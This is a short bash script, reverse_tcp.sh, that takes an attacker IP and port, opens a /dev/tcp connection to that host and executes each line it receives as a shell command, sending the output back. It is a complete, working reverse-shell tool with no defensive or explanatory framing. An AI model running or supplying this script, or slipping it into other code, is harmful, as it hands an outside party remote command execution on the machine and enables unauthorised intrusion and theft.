#!/bin/bash
# reverse_tcp.sh - Establish a reverse TCP shell using a simple socket loop.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching reverse TCP shell to $1:$2..."
exec 5<>/dev/tcp/$1/$2
cat <&5 | while read line; do $line 2>&5 >&5; done
